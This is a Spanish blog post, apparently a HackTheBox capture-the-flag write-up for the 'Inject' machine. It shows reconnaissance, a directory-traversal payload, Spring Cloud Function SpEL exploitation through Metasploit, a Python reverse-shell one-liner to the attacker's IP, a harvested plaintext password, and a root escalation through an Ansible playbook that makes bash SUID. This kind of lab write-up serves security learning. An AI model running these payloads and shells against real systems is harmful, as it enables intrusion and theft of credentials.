+<p>Enviando trazas <strong>ICMP(Internet Control Message Protocol)</strong> y usando el <strong>TTL(Time to Live)</strong> podemos ver identificar el OS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>❯ ping <span class="nt">-c1</span> 10.129.178.241
+PING 10.129.178.241 <span class="o">(</span>10.129.178.241<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.129.178.241: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>214 ms
+
+<span class="nt">---</span> 10.129.178.241 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 214.029/214.029/214.029/0.000 ms
+</pre></td></tr></tbody></table></code></div></div>
+<p>Vemos lo siguiente:</p>
+
+<ul>
+  <li>TTL
+    <ul>
+      <li>El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="analizando-la-web"><span class="mr-2">Analizando la WEB</span><a href="#analizando-la-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><img data-src="/assets/img/commons/inject-writeup/error.png" alt="Web Error" class="center-image" data-proofer-ignore>
+<em>Web Error</em>
+Si entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP.</p>
+
+<p>##Escaneo NMAP</p>
+
+<p>realizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>❯ nmap 10.129.178.241
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04
+Nmap scan report for 10.129.178.241
+Host is up (0.23s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Corre por el puerto 8080, ahora podemos ver la web correctamente.</p>
+
+<p><img data-src="/assets/img/commons/inject-writeup/web.png" alt="Web Error" class="center-image" data-proofer-ignore>
+_Web Error</p>
+
+<h2 id="detectando-posibles-métodos-de-intrución"><span class="mr-2">Detectando posibles métodos de intrución</span><a href="#detectando-posibles-métodos-de-intrución" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un <strong>Sing Up</strong> existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción.</p>
+<h2 id="enumerando-directorios"><span class="mr-2">Enumerando Directorios</span><a href="#enumerando-directorios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Usando <strong>WFUZZ</strong> veremos algunos directorios importantes</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2&gt;/dev/null
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.129.178.241:8080/FUZZ
+Total requests: 220547
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+<span class="o">=====================================================================</span>
+
+000000153:   200        112 L    326 W      5371 Ch     <span class="s2">"blogs"</span>                                                                                                                
+000000051:   200        103 L    194 W      5654 Ch     <span class="s2">"register"</span>                                                                                                             
+000000352:   200        53 L     107 W      1857 Ch     <span class="s2">"upload"</span>                                                                                                               
+000001097:   500        0 L      27 W       712 Ch      <span class="s2">"environment"</span>                                                                                                          
+000002694:   500        0 L      3 W        106 Ch      <span class="s2">"error"</span>                                                                                                                
+000008675:   200        33 L     77 W       1086 Ch     <span class="s2">"release_notes"</span>                                                                                                        
+000022957:   400        0 L      32 W       431 Ch      <span class="s2">"http%3A%2F%2Fwww"</span>                                                                                                     
+000045226:   200        165 L    487 W      6657 Ch     <span class="s2">"http://10.129.178.241:8080/"</span>                                                                                          
+^C
+Total <span class="nb">time</span>: 267.0736
+Processed Requests: 48259
+Filtered Requests: 48251
+Requests/sec.: 180.6954
+
+</pre></td></tr></tbody></table></code></div></div>
+<p>La carpera <strong>/upload</strong> nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivos
+<img data-src="/assets/img/commons/inject-writeup/up.png" alt="Upload" class="center-image" data-proofer-ignore>
+<em>Upload</em></p>
+
+<p>Si suvimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y meremos resultados.
+<img data-src="/assets/img/commons/inject-writeup/up1.png" alt="Imagen" class="center-image" data-proofer-ignore>
+<em>Imagen</em></p>
+
+<p>entramos a ver la imagen y …..mmmm  <strong>img?=</strong> eso huele a <strong>Directory Transversal</strong>.Podemos probar ver el <strong>/etc/passwd</strong> ingresamos la cadena</p>
+
+<p><img data-src="/assets/img/commons/inject-writeup/dt.png" alt="Searchsploit" class="center-image" data-proofer-ignore>
+<em>Directory Transversal</em></p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>../../../../../../../../../../../../../../../../etc/passwd
+</pre></td></tr></tbody></table></code></div></div>
+<p>Pero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater.
+<img data-src="/assets/img/commons/inject-writeup/burp.png" alt="Burpsuite" class="center-image" data-proofer-ignore>
+<em>Burpsuite</em>
+Analizando mas a fondo la web  podemos intentar listar la carppeta donde se guardan las paginas web <strong>/var/www/</strong></p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>❯ curl <span class="s1">'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/'</span>
+html
+WebApp
+</pre></td></tr></tbody></table></code></div></div>
+<p>la careta <strong>WebApp</strong> nos llama la atención podemos listar su contenido</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>❯ curl <span class="s1">'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp'</span>
+.classpath
+.DS_Store
+.idea
+.project
+.settings
+HELP.md
+mvnw
+mvnw.cmd
+pom.xml
+src
+target
+</pre></td></tr></tbody></table></code></div></div>
+<p>Un archivo .xml, lo leemos.</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+</pre></td><td class="rouge-code"><pre>❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml'
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
+	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+	&lt;parent&gt;
+		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+		&lt;version&gt;2.6.5&lt;/version&gt;
+		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
+	&lt;/parent&gt;
+	&lt;groupId&gt;com.example&lt;/groupId&gt;
+	&lt;artifactId&gt;WebApp&lt;/artifactId&gt;
+	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
+	&lt;name&gt;WebApp&lt;/name&gt;
+	&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
+	&lt;properties&gt;
+		&lt;java.version&gt;11&lt;/java.version&gt;
+	&lt;/properties&gt;
+	&lt;dependencies&gt;
+		&lt;dependency&gt;
+  			&lt;groupId&gt;com.sun.activation&lt;/groupId&gt;
+  			&lt;artifactId&gt;javax.activation&lt;/artifactId&gt;
+  			&lt;version&gt;1.2.0&lt;/version&gt;
+		&lt;/dependency&gt;
+
+		&lt;dependency&gt;
+			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+			&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
+		&lt;/dependency&gt;
+		&lt;dependency&gt;
+			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
+		&lt;/dependency&gt;
+
+		&lt;dependency&gt;
+			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+			&lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
+			&lt;scope&gt;runtime&lt;/scope&gt;
+			&lt;optional&gt;true&lt;/optional&gt;
+		&lt;/dependency&gt;
+
+		&lt;dependency&gt;
+			&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
+			&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
+			&lt;version&gt;3.2.2&lt;/version&gt;
+		&lt;/dependency&gt;
+		&lt;dependency&gt;
+			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
+			&lt;scope&gt;test&lt;/scope&gt;
+		&lt;/dependency&gt;
+		&lt;dependency&gt;
+			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
+			&lt;artifactId&gt;bootstrap&lt;/artifactId&gt;
+			&lt;version&gt;5.1.3&lt;/version&gt;
+		&lt;/dependency&gt;
+		&lt;dependency&gt;
+			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
+			&lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;
+		&lt;/dependency&gt;
+
+	&lt;/dependencies&gt;
+	&lt;build&gt;
+		&lt;plugins&gt;
+			&lt;plugin&gt;
+				&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+				&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
+				&lt;version&gt;${parent.version}&lt;/version&gt;
+			&lt;/plugin&gt;
+		&lt;/plugin&gt;
+		&lt;finalName&gt;spring-webapp&lt;/finalName&gt;
+	&lt;/build&gt;
+
+&lt;/project&gt;
+</pre></td></tr></tbody></table></code></div></div>
+<p>Viendo algunas versiones nos encontranos con <strong>Spring Cloud Function Web</strong>, buscando CVE nos encontramos que es vulnerable a SpEL</p>
+
+<h2 id="explotación"><span class="mr-2">Explotación</span><a href="#explotación" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="explotación-manual"><span class="mr-2">Explotación manual</span><a href="#explotación-manual" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>En Proceso…</p>
+
+<h3 id="explotación-con-metasploit"><span class="mr-2">Explotación con MetaSploit</span><a href="#explotación-con-metasploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Nos abrimos metasploit</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>msfconsole
+</pre></td></tr></tbody></table></code></div></div>
+<p>Usando de apoyo este <a href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/spring_cloud_function_spel_injection">foro</a> nos guiaremos.Una vez dentro de metasploit  haremos lo siguiente.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre>[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/http/spring_cloud_function_spel_injection
+[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set RHOST 10.129.178.241
+RHOST =&gt; 10.129.178.241
+[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set LHOST 10.10.14.170
+LHOST =&gt; 10.10.14.170
+[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; run
+
+[*] Started reverse TCP handler on 10.10.14.170:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated.
+[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
+[*] Command Stager progress - 100.00% done (823/823 bytes)
+[*] Sending stage (3045348 bytes) to 10.129.178.241
+[*] Meterpreter session 1 opened (10.10.14.170:4444 -&gt; 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400
+
+(Meterpreter 1)(/) &gt; shell
+Process 76003 created.
+Channel 1 created.
+whoami &amp;&amp; id
+frank
+uid=1000(frank) gid=1000(frank) groups=1000(frank)
+
+Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado.
+
+</pre></td></tr></tbody></table></code></div></div>
+<p>export RHOST=”10.10.14.170”;export RPORT=443;python3 -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“bash”)’</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar.
+
+```bash
+❯ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474
+frank@inject:/$
+</pre></td></tr></tbody></table></code></div></div>
+<p>Aplicamos tratamiento a la <a href="https://h4ckerlite.github.io/posts/tty/">TTY</a></p>
+
+<h2 id="migraciñon-de-usuario"><span class="mr-2">Migraciñon de usuario</span><a href="#migraciñon-de-usuario" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>En la carpeta personal del usuario listamos carpetas escondidad</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>frank@inject:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
+<span class="nb">.</span>  ..  .bash_history  .bashrc  .cache  .local  .m2  .profile
+frank@inject:~<span class="nv">$ </span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>la carpeta <strong>.m2</strong> nos llama la atención, listamos su contenido</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre>frank@inject:~<span class="nv">$ </span><span class="nb">ls</span> .m2
+settings.xml
+frank@inject:~<span class="nv">$ </span><span class="nb">cat</span> .m2/<span class="k">*</span>
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;settings <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
+        xsi:schemaLocation<span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="o">&gt;</span>
+  &lt;servers&gt;
+    &lt;server&gt;
+      &lt;<span class="nb">id</span><span class="o">&gt;</span>Inject&lt;/id&gt;
+      &lt;username&gt;phil&lt;/username&gt;
+      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+      &lt;privateKey&gt;<span class="k">${</span><span class="nv">user</span><span class="p">.home</span><span class="k">}</span>/.ssh/id_dsa&lt;/privateKey&gt;
+      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+      &lt;configuration&gt;&lt;/configuration&gt;
+    &lt;/server&gt;
+  &lt;/servers&gt;
+&lt;/settings&gt;
+frank@inject:~<span class="nv">$ </span>
+
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Vemos la contraseña del usuario <strong>phil</strong>, migramos…</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>frank@inject:~<span class="nv">$ </span>su phil
+Password:DocPhillovestoInject123 
+phil@inject:/home/frank<span class="nv">$ </span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>…en su carpeta personal procedemos a leer la primera flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>phil@inject:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+be<span class="k">****************************</span>36
+phil@inject:~<span class="nv">$ </span>
+
+</pre></td></tr></tbody></table></code></div></div>
+<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de Privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>No encontramos ningun binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño <strong>staff</strong>.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>phil@inject:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
+phil@inject:~<span class="nv">$ </span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>phil@inject:~<span class="nv">$ </span>find / <span class="nt">-group</span> staff <span class="nt">-print</span> 2&gt;/dev/null
+/opt/automation/tasks
+/root
+/var/local
+</pre></td></tr></tbody></table></code></div></div>
+<p>La ruta <strong>/opt/automation/tasks</strong> nos llama la atención.</p>
+
+<p>```phil@inject:~$ ls /opt/automation/tasks/
+playbook_1.yml
+phil@inject:~$</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después.
+```bash
+phil@inject:/opt/automation/tasks$ ls -lah
+total 12K
+drwxrwxr-x 2 root staff 4.0K Mar 13 01:46 .
+drwxr-xr-x 3 root root  4.0K Oct 20 04:23 ..
+-rw-r--r-- 1 root root   150 Mar 13 01:46 playbook_1.yml
+phil@inject:/opt/automation/tasks$
+</pre></td></tr></tbody></table></code></div></div>
+<p>Un archivo .YML buscamos en internet el nombre del arvhivo “playbook”. Buscando en internet nos encotramos con este <a href="https://iamnasef.com/projects/ansible-privilege-escalation/">blog</a> que nos lleva a un archivo de <a href="https://github.com/iamnasef/ansible-privilege-escalation/blob/main/shell.yml">github</a>. Creamos un archivo shell.yml con el siguiente contenido.</p>
+
+<p>Esto copiara la bash en y la convertirá en SUID y podemos spawnear una shell como root.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nt">---</span>                                                                                                               
+- name: shell                                                                                                  
+  hosts: localhost
+  become: <span class="nb">yes
+
+  </span>tasks:
+  - name: hack
+    shell: <span class="s2">"cp /bin/bash . &amp;&amp; chmod +sx bash"</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Una vez pasado los 2 minutos spawneamos la shell como root con:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>/usr/bin/ansible-playbook shell.yml
+./bash <span class="nt">-p</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Hurra!!!! somos root, procedemos a leer la flag del usuario root</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>bash-5.0# <span class="nb">cat </span>root.txt
+4e<span class="k">****************************</span>67
+bash-5.0# 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Máquina Pwneada, sigue así muchacho.</p>
+
+
+</div>
+
+<div class="post-tail-wrapper text-muted">
+
+  <!-- categories -->
+  
+  <div class="post-meta mb-3">
+    <i class="far fa-folder-open fa-fw mr-1"></i>
+    
+      <a href='/categories/hackthebox/'>hackthebox</a>,
+      <a href='/categories/machine/'>machine</a>,
+      <a href='/categories/writeup/'>writeup</a>
+  </div>
+  
+
+  <!-- tags -->
+  
+  <div class="post-tags">
+    <i class="fa fa-tags fa-fw mr-1"></i>
+      
+      <a href="/tags/hackthebox/"
+          class="post-tag no-text-decoration" >hackthebox</a>
+      
+      <a href="/tags/writeup/"
+          class="post-tag no-text-decoration" >writeup</a>
+      
+      <a href="/tags/easy/"
+          class="post-tag no-text-decoration" >easy</a>
+      
+      <a href="/tags/directory-transversal/"
+          class="post-tag no-text-decoration" >directory transversal</a>
+      
+      <a href="/tags/playbook/"
+          class="post-tag no-text-decoration" >playbook</a>
+      
+      <a href="/tags/spring-spel/"
+          class="post-tag no-text-decoration" >spring SpEL</a>
+      
+  </div>
+  
+
+  <div class="post-tail-bottom
+    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
+    <div class="license-wrapper">
+
+      
+
+        
+
+        Esta entrada está licenciada bajo 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         por el autor.
+
+      
+    </div>
+
+    <!--
+ Post sharing snippet
+-->
+
+<div class="share-wrapper">
+  <span class="share-label text-muted mr-1">Compartir</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+      
+        <a href="https://twitter.com/intent/tweet?text=Inject+WriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Finject-writeup%2F" data-toggle="tooltip" data-placement="top"
+          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
+          <i class="fa-fw fab fa-twitter"></i>
+        </a>
+    
+      
+        <a href="https://www.facebook.com/sharer/sharer.php?title=Inject+WriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Finject-writeup%2F" data-toggle="tooltip" data-placement="top"
+          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
+          <i class="fa-fw fab fa-facebook-square"></i>
+        </a>
+    
+      
+        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Finject-writeup%2F&text=Inject+WriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
+          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
+          <i class="fa-fw fab fa-telegram"></i>
+        </a>
+    
+
+    <i id="copy-link" class="fa-fw fas fa-link small"
+        data-toggle="tooltip" data-placement="top"
+        title="Copiar enlace"
+        data-title-succeed="¡Enlace copiado!">
+    </i>
+
+  </span>
+</div>
